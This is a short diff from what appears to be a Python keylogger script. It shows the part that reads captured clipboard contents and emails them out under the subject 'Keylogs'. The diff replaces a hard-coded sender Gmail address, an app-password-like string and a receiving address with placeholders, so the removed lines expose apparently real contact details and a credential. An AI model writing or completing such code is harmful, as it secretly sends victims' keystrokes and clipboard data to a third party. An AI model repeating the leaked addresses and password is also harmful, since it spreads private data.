@@ -94,9 +94,9 @@ if __name__ == "__main__":
     with open ("clipboard.txt",'r') as clipkeys:
         keys_content+=clipkeys.read()
 
-    sender_email = "croww9546@gmail.com"
-    password= "tltp cwsz xyah keca"
-    reciever_mail = "21012250910008@ljku.edu.in"
+    sender_email = "sender@gmail.com"
+    password= "tltpwecwsz90sweyah23eca"
+    reciever_mail = "reciever@gmail.com"
 
     subject="Keylogs"
     message = keys_content
